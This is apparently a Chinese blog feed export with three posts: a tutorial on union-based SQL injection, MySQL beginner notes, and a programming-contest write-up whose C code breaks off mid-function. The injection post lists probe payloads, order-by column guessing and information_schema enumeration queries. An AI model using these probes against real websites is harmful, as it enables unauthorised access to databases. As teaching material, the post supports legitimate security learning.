        <content type="html"><![CDATA[<h1 id="联合查询输入-来自：sechub"><a href="#联合查询输入-来自：sechub" class="headerlink" title="联合查询输入 来自：sechub"></a>联合查询输入 来自：sechub</h1><h2 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h2><p>我们可能存在SQL注入变量的后边添加以下payload：</p><ul><li>and 1&#x3D;1 &#x2F; and 1&#x3D;2 回显页面不同（整型判断）</li><li>单引号判断’显示数据库错误信息或者页面回显不同（整型，字符串类型判断）</li><li>\ (转义符)</li><li>-1 &#x2F; +1 回显下一个或上一个页面 （整型判断）</li></ul><p>注：加号’+’在URL中有特殊含义，因此在需要对其进行URL编码为%2b</p><h2 id="2-判断是整型注入还是字符型注入"><a href="#2-判断是整型注入还是字符型注入" class="headerlink" title="2.判断是整型注入还是字符型注入"></a>2.判断是整型注入还是字符型注入</h2><p>数字型与字符型的最大区别在于：<br>    数字类型不需要引号闭合，而字符类型需要使用引号闭合。</p><p>数字型：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>字符型:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="3-根据不同的分类进行注入"><a href="#3-根据不同的分类进行注入" class="headerlink" title="3.根据不同的分类进行注入"></a>3.根据不同的分类进行注入</h2><p>根据SQL注入语法分类：</p><ul><li>UNION query SQL injection(可联合查询注入)</li><li>Error-based SQL injection(报错型注入)</li><li>Boolean-based blind SQL injection(基于布尔型注入)</li><li>Time-based blind SQL injection(基于时间延迟注入)</li><li>Stacked queries SQL injection(可多语句查询注入)</li></ul><h3 id="3-1-MySQL中UNION使用规则"><a href="#3-1-MySQL中UNION使用规则" class="headerlink" title="3.1 MySQL中UNION使用规则"></a>3.1 MySQL中UNION使用规则</h3><p>UNION的作用时间俩个或多个select语句查询结果合并起来</p><ul><li>UNION必须由俩条或俩条以上的select语句组成，语句之间用UNION分隔</li><li>UNION中的每个查询的列数必须相同</li><li>UNION会从查询结果集中自动去除重复行</li></ul><h3 id="3-2-判断查询列数"><a href="#3-2-判断查询列数" class="headerlink" title="3.2 判断查询列数"></a>3.2 判断查询列数</h3><p>order by 函数是对MySQL中查询结果按照制定字段名进行排序，除了指定字段名还可以指定字段的栏位进行排序，第一个查询字段位1，第二个位2，以此类推，我们可以通过二分猜解列数。<br>例：</p><p>order by 1</p><p>order by 20</p><p>order by 10</p><h3 id="3-3-获取所有数据库名"><a href="#3-3-获取所有数据库名" class="headerlink" title="3.3 获取所有数据库名"></a>3.3 获取所有数据库名</h3><p>group_concat()一次性显示：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><p>limit逐一显示：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(SCHEMA_NAME) <span class="keyword">FROM</span> information_schema.schemata #查询数据库个数</span><br><span class="line"><span class="keyword">select</span> SCHEMA_NAME <span class="keyword">from</span> information_schema.SCHEMATA limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="3-4-获取数据库-test-所有表名"><a href="#3-4-获取数据库-test-所有表名" class="headerlink" title="3.4 获取数据库(test)所有表名"></a>3.4 获取数据库(test)所有表名</h3><p>group_concat()一次性显示：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><p>limi 逐一显示</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.SCHEMATA <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="4-联合查询"><a href="#4-联合查询" class="headerlink" title="4.联合查询"></a>4.联合查询</h2><p>前提条件：页面上有显示位</p><p>什么是显示位？</p><p>在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫<em>显示位</em></p><h2 id="5-过程"><a href="#5-过程" class="headerlink" title="5.过程"></a>5.过程</h2><p><img src="https://s2.loli.net/2023/03/18/3TneEwuYtpIokxd.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL学习笔记</title>
      <link href="/2023/03/12/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/12/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>u root <span class="operator">-</span>p123456 <span class="comment">--登陆时密码-p后不能有空格</span></span><br><span class="line"><span class="keyword">update</span> mysql.user <span class="keyword">set</span> authentication_string<span class="operator">=</span>password(<span class="string">&#x27;123456&#x27;</span>) <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> Host <span class="operator">=</span> <span class="string">&#x27;localhost&#x27;</span>; <span class="comment">--修改用户密码</span></span><br><span class="line">flush privileges; <span class="comment">-- 刷新权限</span></span><br><span class="line">所有语句结尾都是用;结尾</span><br><span class="line"><span class="keyword">show</span> databases; <span class="comment">-- 查看所有数据库</span></span><br><span class="line">mysql<span class="operator">&gt;</span> use home <span class="comment">-- 切换数据库 use 数据库名</span></span><br><span class="line"><span class="keyword">show</span> tables; <span class="comment">-- 查看数据库中所有的表</span></span><br><span class="line"><span class="keyword">describe</span> student; <span class="comment">-- 显示数据库中所有信息</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/PlXSLUocQie21Wz.png" alt="image.png"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database westos; <span class="comment">-- 创建一个数据库</span></span><br><span class="line"></span><br><span class="line">exit; <span class="comment">-- 退出连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 单行注释(SQL的本来的注释)</span></span><br><span class="line"><span class="comment">/*SQL多行注释</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">3</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>数据库xxx语言 CRUD增删改查</p><p>DDL 定义</p><p>DML 操作</p><p>DQL 查询</p><p>DCL 控制</p><h1 id="操作数据库"><a href="#操作数据库" class="headerlink" title="操作数据库"></a>操作数据库</h1><p>操作数据库-&gt;操作数据库中的表-&gt;操作数据库中表的数据</p><p>mysql 关键字不区分大小写 </p><h2 id="1-创建数据库"><a href="#1-创建数据库" class="headerlink" title="1. 创建数据库"></a>1. 创建数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> westos;</span><br></pre></td></tr></table></figure><h2 id="2-删除数据库"><a href="#2-删除数据库" class="headerlink" title="2. 删除数据库"></a>2. 删除数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> westos;</span><br></pre></td></tr></table></figure><h2 id="3-使用数据库"><a href="#3-使用数据库" class="headerlink" title="3. 使用数据库"></a>3. 使用数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- tab键上面，如果你的表名或者字段名时一个特殊字符，就需要带 ( ` )</span></span><br><span class="line">USE home;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/Ew4zWRp1nCgAbIv.png" alt="image.png"></p><h2 id="4-查看数据库"><a href="#4-查看数据库" class="headerlink" title="4. 查看数据库"></a>4. 查看数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES; <span class="comment">--查看所有数据可</span></span><br></pre></td></tr></table></figure><p>学习思路<br>    - 对照SQLyog可视化，然后在历史记录里查看<br>    - 固定的语法或关键字必须强行记住</p><h1 id="数据库的数据类型"><a href="#数据库的数据类型" class="headerlink" title="数据库的数据类型"></a>数据库的数据类型</h1><h2 id="数值"><a href="#数值" class="headerlink" title="数值"></a>数值</h2><ul><li>tinyint 十分小的数据 1个字节</li><li>smallint 较小的数据  2个字节</li><li><strong>int 标准的整数  4个字节</strong></li><li>bigint 较大的数据 8个字节</li><li>float 浮点数 4个字节 </li><li>double 浮点数 8个字节 （精度问题）</li><li>decimal 字符串形式的浮点数 金融计算一般使用decimal</li></ul><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><ul><li>char 字符串 固定大小 0-255</li><li><strong>varchar 可变长字符串 0-65535</strong> 常用的变量 String</li><li>tinytext 微型文本 2^8 - 1 </li><li>text 文本串 2^16 - 1 保存大文本</li><li></li></ul><h2 id="时间日期"><a href="#时间日期" class="headerlink" title="时间日期"></a>时间日期</h2><ul><li>date YYYY-MM-DD，日期格式</li><li>time HH:mm:ss 时间格式 </li><li><strong>datetime 最常用的时间格式</strong></li><li><strong>timestamp 时间戳,1970.1.1 到现在的毫秒数！</strong></li><li>year 年份</li></ul><h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><ul><li>没有值或未知<br><strong>注意， 不要使用null进行运算，结果位NULL</strong></li></ul><h1 id="数据库的字段属性"><a href="#数据库的字段属性" class="headerlink" title="数据库的字段属性"></a>数据库的字段属性</h1><p><em>Unsigned</em>:</p><ul><li>无符号的整数</li><li>声明了该列不能声明为负数</li></ul><p><em>zerofill</em>:</p><ul><li>0填充的</li><li>不足的位数，使用0来填充，int(3), 5—005</li></ul><p> <em>自增</em></p><ul><li>通常理解为，自动在上一条记录的基础上+1（默认）</li><li>通常用来设计唯一的主键-index，必须是整数类型</li><li>可以自定义设计主键自增的起始值和步长</li></ul><p> <em>非空 Null not null</em></p><ul><li>假设设施为not null，如果不给它赋值，就会报错！</li><li>NULL,如果不填值，默认为NULL</li></ul><p> <em>默认</em> </p><ul><li>设置默认值</li><li>sex，比如默认值为男，如果不指定该列的值，则默认为男</li></ul><h3 id="student-1"><a href="#student-1" class="headerlink" title="student 1"></a>student 1</h3> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 目标：创建一个scahool数据库</span></span><br><span class="line"><span class="comment">-- 创建学生表（列，字段） 使用SQL创建</span></span><br><span class="line"><span class="comment">-- 学号int 登陆密码varchar（20） 姓名，性别varcahr（2），出生日期（datatime），家庭住址，email</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 注意点，使用英文（），表的名称和字段尽量用``括起来</span></span><br><span class="line"><span class="comment">-- AUTO_INCREMENT 自增</span></span><br><span class="line"><span class="comment">-- 字符串使用单引号括起来！</span></span><br><span class="line"><span class="comment">-- 所有的语句后面加,(英文的)，最后一个不用加</span></span><br><span class="line"><span class="comment">-- primary key ,主键一般一个表只有一个唯一的主键</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `student3` (</span><br><span class="line">`id` <span class="type">INT</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;学号&#x27;</span>,</span><br><span class="line">`name` <span class="type">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;匿名&#x27;</span> COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">`password` <span class="type">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;123456&#x27;</span> COMMENT <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line">`sex` <span class="type">VARCHAR</span>(<span class="number">2</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;无&#x27;</span> COMMENT <span class="string">&#x27;性别&#x27;</span>,</span><br><span class="line">`birthday` DATETIME <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;出生日期&#x27;</span>,</span><br><span class="line">`address` <span class="type">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;家庭住址&#x27;</span>,</span><br><span class="line">`email` <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;邮箱&#x27;</span>,</span><br><span class="line"><span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>INNODB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"><span class="comment">-- 这个冒号在SQLyog可加可不加</span></span><br></pre></td></tr></table></figure><p> <strong>格式</strong><br> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [if <span class="keyword">not</span> <span class="keyword">exists</span>] `表名`(</span><br><span class="line">    <span class="string">&#x27;字段名1&#x27;</span> 列类型 [属性][索引][注释],</span><br><span class="line">    <span class="string">&#x27;字段名2&#x27;</span> 列类型 [属性][索引][注释],</span><br><span class="line">    #...</span><br><span class="line">    <span class="string">&#x27;字段名n&#x27;</span> 列类型 [属性][索引][注释]</span><br><span class="line">)[表类型][表字符集][注释];</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> DATABASE school <span class="comment">-- 查看创建数据库的语句</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student <span class="comment">-- 查看student数据表的定义语句</span></span><br><span class="line"><span class="keyword">DESC</span> student <span class="comment">-- 显示表的结构</span></span><br></pre></td></tr></table></figure><h2 id="数据表的类型"><a href="#数据表的类型" class="headerlink" title="数据表的类型"></a>数据表的类型</h2> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 关于数据库引擎</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">INNODB 默认使用~</span></span><br><span class="line"><span class="comment">MYISAM 早些年使用的</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>MYISAM</th><th>INNODB</th></tr></thead><tbody><tr><td>事务支持</td><td>不支持</td><td>支持</td></tr><tr><td>数据行锁定</td><td>不支持</td><td>支持</td></tr><tr><td>外键约束</td><td>不支持</td><td>支持</td></tr><tr><td>全文索引</td><td>支持</td><td>不支持</td></tr><tr><td>表空间大小</td><td>较小</td><td>较大，约为2倍</td></tr><tr><td>常规使用操作：</td><td></td><td></td></tr></tbody></table><ul><li>MYISAM 节约空间，速度较快</li><li>INNODB 安全性高，多表多用户操作</li></ul><p> 在物理空间的位置:<br> 所有的数据库文件都在data目录下<br> 本质还是文件的存储</p><p> MySQL引擎在物理文件上的去呗</p><ul><li>InnoDB 在数据库表中只有一个*.frm文件，以及上级目录下的ibdata1文件</li><li>MYISAM<ol><li>*.frm 表结构的定义文件</li><li>*.MYD 数据文件（data) </li><li>*myi 索引文件(index)<br>设置数据库表的字符集编码<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">CHARSET<span class="operator">=</span>utf8</span><br></pre></td></tr></table></figure><em>不设置的话，会时MySQL默认的字符集（不支持中文）</em><br>MySQL的默认便把时Latin1<br>可在my.ini修改</li></ol></li></ul><h2 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> teacher rename <span class="keyword">as</span> teacher1； <span class="comment">-- 修改表名</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> teacher1 <span class="keyword">add</span> age <span class="type">int</span>(<span class="number">11</span>)； <span class="comment">-- 增加字段</span></span><br></pre></td></tr></table></figure><h3 id="修改表的字段-重命名，修改约束！"><a href="#修改表的字段-重命名，修改约束！" class="headerlink" title="修改表的字段(重命名，修改约束！)"></a>修改表的字段(重命名，修改约束！)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> teacher1 modify age <span class="type">varchar</span>(<span class="number">11</span>); <span class="comment">-- 修改约束</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> teacher1 change age age1 <span class="type">int</span>(<span class="number">1</span>); <span class="comment">-- 字段重命名</span></span><br><span class="line"><span class="comment">-- change 用来字段重命名，不能修改字段类型和约束</span></span><br><span class="line"><span class="comment">-- modify 不用来字段重命名，之恶能修改类型和约束</span></span><br></pre></td></tr></table></figure><h2 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> teacher1 <span class="keyword">drop</span> age; <span class="comment">-- 删除表的字段</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> teacher1p; <span class="comment">-- 删除整个表</span></span><br></pre></td></tr></table></figure><p><em>所有的创建和和三处操作尽量加上判断，以免报错</em></p><p>注意点:</p><ul><li>&#96;&#96;字段名用这个包裹</li><li>注释– &#x2F;**&#x2F;</li><li>sql关键字大小写不敏感，建议小写</li><li>所有的符号用英文</li></ul><h1 id="Mysql的数据管理"><a href="#Mysql的数据管理" class="headerlink" title="Mysql的数据管理"></a>Mysql的数据管理</h1><h2 id="3-1-外键-了解即可"><a href="#3-1-外键-了解即可" class="headerlink" title="3.1. 外键(了解即可"></a>3.1. 外键(了解即可</h2><p>方式一:在创建表的时候，增加约束</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 学生表的gradeid字段，要去引用年级表的gradeid</span></span><br><span class="line"><span class="comment">-- 定义外键key</span></span><br><span class="line"><span class="comment">-- 给这个外键添加约束 (执行引用) references 引用</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `student` (</span><br><span class="line">    `id` <span class="type">INT</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;学号&#x27;</span>,</span><br><span class="line">    `name` <span class="type">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;匿名&#x27;</span> COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">    `password` <span class="type">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;123456&#x27;</span> COMMENT <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line">    `sex` <span class="type">VARCHAR</span>(<span class="number">2</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;无&#x27;</span> COMMENT <span class="string">&#x27;性别&#x27;</span>,</span><br><span class="line">    `birthday` DATETIME <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;出生日期&#x27;</span>,</span><br><span class="line">    `address` <span class="type">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;家庭住址&#x27;</span>,</span><br><span class="line">    `email` <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;邮箱&#x27;</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY(`id`)</span><br><span class="line">    KEY `FK_gradeid` (`gradeid`)</span><br><span class="line">    <span class="keyword">constraint</span> `FK_gradeid` <span class="keyword">foreign</span> key(`gradeid`) <span class="keyword">references</span> `grade` (`gradeid`)</span><br><span class="line">) ENGINE<span class="operator">=</span>INNODB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br></pre></td></tr></table></figure><p>方式二: 创建表成功后，没有外键关系</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建表的时候没有外键关系</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> `student`</span><br><span class="line"><span class="keyword">add</span> constaint `FK_gradeid` <span class="keyword">foreign</span> key(`gradeid`) <span class="keyword">references</span> `grade` (`gradeid`);</span><br></pre></td></tr></table></figure><p>删除有外键关系的表的时候，必须要先删除引用别人的表（从表），再删除主表</p><p>以上的操作都是物理外键，数据库级别的外键，我们不建议使用！（避免数据库过多困扰）</p><p><em>最佳实践</em></p><ul><li>数据库就是单纯的表，只用来存数据，只有行（数据）和列（字段）</li><li>我们想使用多张表的数据，想使用外键（程序去使用）</li><li></li></ul><h2 id="3-2-DML语言-全部记住"><a href="#3-2-DML语言-全部记住" class="headerlink" title="3.2. DML语言(全部记住)"></a>3.2. DML语言(全部记住)</h2><p>数据库意义:数据存储、数据管理<br>DML语言：数据操作语言</p><ul><li>insert</li><li>update</li><li>delet</li></ul><h3 id="3-2-1-添加insert"><a href="#3-2-1-添加insert" class="headerlink" title="3.2.1 添加insert"></a>3.2.1 添加insert</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 插入语句（添加）</span></span><br><span class="line"><span class="comment">-- insert into 表名([字段名1，字段2，字段3])values(&#x27;值1&#x27;),(&#x27;值2&#x27;)....</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `grade`(`gradename`) <span class="keyword">values</span>(`大四`);</span><br><span class="line"><span class="comment">--由于主键自增，我们可以省略(如果不写表的字段就会一一匹配)</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `grade` <span class="keyword">values</span>(<span class="string">&#x27;大三&#x27;</span>);</span><br><span class="line"><span class="comment">-- 一般写插入语句，我们一定要数据和字段一一对应！</span></span><br><span class="line"><span class="comment">-- 插入多个字段</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `grade`(`gradename`) <span class="keyword">values</span>(<span class="string">&#x27;大二&#x27;</span>),(<span class="string">&#x27;大一&#x27;</span>,)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `student`(`name`) <span class="keyword">values</span> (<span class="string">&#x27;张三&#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `student`(`name`,`pwd`,`sex`) <span class="keyword">values</span>(<span class="string">&#x27;李四&#x27;</span>,<span class="string">&#x27;aaaaa&#x27;</span>,<span class="string">&#x27;男&#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `student` <span class="keyword">values</span> (<span class="number">5</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;2001-02-01&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;西安&#x27;</span>,<span class="string">&#x27;Email&#x27;</span>)</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>字段和字段之间使用英文逗号隔开</li><li>字段是可以省略的，但是后面的值必须一一对应</li><li>可以同时插入多条数据，values后面的值，需要使用逗号隔开</li></ul><h3 id="3-2-2-修改"><a href="#3-2-2-修改" class="headerlink" title="3.2.2 修改"></a>3.2.2 修改</h3><h3 id="3-2-3-删除"><a href="#3-2-3-删除" class="headerlink" title="3.2.3 删除"></a>3.2.3 删除</h3><h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2>]]></content>
      
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>牛客小白赛68失败经验</title>
      <link href="/2023/03/12/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E8%B5%9B68%E5%A4%B1%E8%B4%A5%E7%BB%8F%E9%AA%8C/"/>
      <url>/2023/03/12/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E8%B5%9B68%E5%A4%B1%E8%B4%A5%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="参赛经历"><a href="#参赛经历" class="headerlink" title="参赛经历"></a>参赛经历</h1><p>本来是去初学者试炼营，偶然点进小白赛，发现参赛的方式不是很复杂，蛮试一下</p><h1 id="A题"><a href="#A题" class="headerlink" title="A题"></a>A题</h1><h2 id="Tokitsukaze-and-New-Operation"><a href="#Tokitsukaze-and-New-Operation" class="headerlink" title="Tokitsukaze and New Operation"></a>Tokitsukaze and New Operation</h2><p><img src="https://s2.loli.net/2023/03/12/GaZ1gIvte2FpdSi.png" alt="1.png"><br><img src="https://s2.loli.net/2023/03/12/n7ZzfrcdYVL4lyU.png" alt="2.png"></p><p>我的思路是用模10，除10的方法遍历每位数，再去做，途中也遇到很多问题，相乘小于10，要乘的10的不同次方，在解决种种问题后，自测运行过了</p><h3 id="判断位数是否一致"><a href="#判断位数是否一致" class="headerlink" title="判断位数是否一致"></a>判断位数是否一致</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">istrue</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> countx = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> county = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">x = x / <span class="number">10</span>;</span><br><span class="line">countx++;</span><br><span class="line">&#125;<span class="keyword">while</span> (x != <span class="number">0</span>);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">y = y / <span class="number">10</span>;</span><br><span class="line">county++;</span><br><span class="line">&#125;<span class="keyword">while</span> (y != <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (countx == county)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="计算各位数相乘"><a href="#计算各位数相乘" class="headerlink" title="计算各位数相乘"></a>计算各位数相乘</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cacux</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> num = x;<span class="comment">//注意x的值不能变，引入变量 </span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">num = num / <span class="number">10</span>;</span><br><span class="line">count++;</span><br><span class="line">&#125;<span class="keyword">while</span> (num != <span class="number">0</span>);</span><br><span class="line"><span class="comment">//printf(&quot;%d\n&quot;, count);</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">&#123;</span><br><span class="line">ret += (x % <span class="number">10</span>) * (y % <span class="number">10</span>) * <span class="built_in">pow</span>(<span class="number">10</span>, j);</span><br><span class="line"><span class="keyword">if</span> ((x % <span class="number">10</span>) * (y % <span class="number">10</span>) &lt; <span class="number">10</span>)</span><br><span class="line">j = j + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">j = j + <span class="number">2</span>;</span><br><span class="line">x = (x - (x % <span class="number">10</span>)) / <span class="number">10</span>;</span><br><span class="line">y = (y - (y % <span class="number">10</span>)) / <span class="number">10</span>;</span><br><span class="line"><span class="comment">//printf(&quot;%d %d %d\n&quot;, ret, x, y);</span></span><br><span class="line"><span class="comment">//为0的话就不能往上，&lt;10 </span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span 